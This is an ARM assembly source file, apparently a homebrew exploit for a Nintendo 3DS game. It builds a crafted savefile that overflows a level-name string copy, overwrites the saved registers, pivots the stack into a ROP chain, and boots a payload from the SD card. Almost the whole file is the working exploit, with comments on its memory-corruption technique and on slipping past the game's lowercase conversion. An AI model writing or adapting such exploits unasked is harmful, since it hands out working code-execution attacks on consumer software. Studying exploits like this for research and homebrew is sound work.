.arm
.section .init
.global _start

_start:

#define ROPKIT_LINEARMEM_BUF (0x14000000+0x2000000)

#define ROPKIT_APPMEM_TEXT_OFFSET 0x7900000

//Only works with the game's exheader patched for enabling SD access.
#define ROPKIT_BINPAYLOAD_PATH "sd:/payload.bin"
#define ROPKIT_MOUNTSD

#include "ropkit_ropinclude.s"

//STACKPIVOT_ADR: "ldm r4, {ip, sp, lr, pc}"
//ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ: Call vtable funcptr +0x10 from the r5 object.

//ROPBUF: Address of this savefile buffer in the heap. It's unknown whether this varies per-region, there doesn't seem to be any localization strings in memory prior to this heap addr.

@ The savefile doesn't contain any checksum/CRC.

.word 0x13304f6 @ +0x0 u32: Magicnum 0x13304f6.
.word 0x714 @ +0x4 u32: Magicnum 0x714.
.word 0x0 @ +0x8 u8: Savefile#(0..2). The value doesn't seem to matter much except when the savefile is being updated.
.string16 "product" @ +0xc 0x10-bytes: UTF-16 string, normally "product".
.hword 0x0 @ +0x1c u16, Unknown. When updating the savefile this is set to: ((savefile_xef0_u16 * 0x8889) << 4) >> 24.
.byte 0, 4 @ +0x1e..0x1f: This is the total playtime. byte0 = minutes, byte1 = hours. When updating the savefile the two bytes from savefile+0xef2 are copied to here.
.word 0 @ +0x20 u32: When updating the savefile the u32 from savefile+0x180 is copied to here. This is a bitmask with 5 bits, for the stickers displayed on the save-select screen.
.word 0 @ +0x24, Unknown.
.word 0xEA8329E0, 0x78 @ +0x28 u64: Timestamp in the usual format(milliseconds since January 1, 2000). This is updated each time the savefile is updated.
.word 0x1000 @ +0x30 u32: Counter. When updating the savefile, this is set to <highest counter value from all 3 savefiles> + 1. The savefile with the highest counter value is the one that is initially 'selected' on the save-select screen.
.string "mac_1" @ +0x34 char[]: Some 0x10-byte level string. When updating the savefile, the 0x10-bytes here are cleared first, then this is done: strcpy(savefile+0x34, savefile+0x48). This particular strcpy isn't an issue.
.word 0 @ +0x44 u32: ?

.space ((_start + 0x48) - .)
@ +0x48 char[]: Some level string. This is the string used for haxx.

@ Fill the stackframe with 0x44-bytes with value 0x58('X'), which then gets converted to 'x'.
.fill 0x44, 1, 0x58

@ The saved registers get overwritten with the below data.
.word ROPBUF + (pivotdata - _start) @ r4. This has to be an address that won't get modifed during lowercase conversion.
.word ROPBUF + (pivotdata - _start) @ r5, same as r4.
.word ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ @ pc. The string copy ends here due to the nul-terminator in this address. This has to be an address that won't get modifed during lowercase conversion.

.space ((_start + 0x19c) - .)
pivotdata:
.word ROPBUF + ((pivotdata+0x8-0x10) - _start) @ ip, also used as the vtableptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
.word ROPBUF + (ropstackstart - _start) @ sp
.word STACKPIVOT_ADR @ lr, also used as the the vtable funcptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
.word ROP_POPPC @ pc

ropstackstart:
#include "ropkit_boototherapp.s"

.space ((_start + 0x26b0) - .)

